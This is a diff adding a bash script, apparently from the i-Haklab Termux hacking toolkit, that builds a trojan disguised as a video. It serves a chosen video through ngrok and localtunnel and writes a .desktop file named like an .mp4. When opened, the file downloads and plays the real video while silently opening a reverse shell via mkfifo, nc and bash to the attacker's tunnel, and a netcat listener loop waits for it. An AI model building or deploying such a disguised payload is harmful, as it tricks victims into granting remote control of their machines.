@@ -1,0 +1,55 @@
+#!/data/data/com.termux/files/usr/bin/bash
+#This file is part of i-Haklab command
+IFS=$'\n\t'
+trap ctrl_c 2
+source $HOME/.local/etc/i-Haklab/variables
+source $iHETC/functions
+
+chk-pkg php php
+chk-pkg ngrok ngrok
+
+killps(){ 
+	[[ $(ps aux|grep -o ngrok|head -n1) ]] && {
+		pkill -f -2 ngrok 2>/dev/null;
+			killall -2 ngrok &>/dev/null;
+		}
+}
+ctrl_c(){ killps;}
+
+banner
+printf "$G(_>)_Set_video$W\n"
+while read -p " ╰───➤ " realVID  && [ -z $realVID ] || [ ! -e $realVID ];do
+	printf "$R(_➤)$W Not such file $R|$W Try again.\n"
+done
+cp $realVID $TMPDIR
+fakeVID=$(ls $realVID|awk -F '/' '{print $NF}')_vid
+
+printf "$G(_➤)$W running ngrok server"
+exec ngrok -tcp 4546 >/dev/null >2/dev/null &
+sleep 15
+revHOST=$(curl -sSL http://localhost:4040/api/tunnels|cut -d '"' -f14|awk -F "/" '{print $3}'|cut -d ":" -f1)
+revPORT=$(curl -sSL http://localhost:4040/api/tunnels|cut -d '"' -f14|awk -F "/" '{print $3}'|cut -d ":" -f2)
+[[ -z $revHOST ]] && { printf >&2 $R"ERROR:$W ngrok tunnel failed\n";exit;}
+
+printf "$G(_➤)$W running php server over tun0."
+exec lt -h "http://localtunnel.me" -p 4545 -s mis-videos >/dev/null 2>/dev/null &
+exec php -S 127.0.0.1:4545 -t $TMPDIR
+
+printf "$G(_➤)$W creating fake video."
+cat <<- CONF > $TMPDIR/$fakeVID.desktop
+#!/usr/bin/env xdg-open
+
+[Desktop Entry]
+Encoding=UTF-8
+Name=$fakeVID.mp4
+Exec=/usr/bin/wget 'https://mis-videos.loca.lt/$realVID' -O /tmp/real_video.mp4; /usr/bin/xdg-open /tmp/real_video.mp4; /usr/bin/mkfifo /tmp/f; /bin/nc $revHOST $revPORT < /tmp/f | /bin/bash -i > /tmp/f 2>&1 &
+Terminal=false
+Type=Application
+Icon=video-x-generic
+CONF
+printf "$G ╰─DONE──➤$W $TMPDIR/$fakeVID.desktop"
+
+printf "$G(_➤)$W running netcat."
+while true;do
+	nc -nvlp 4546
+done
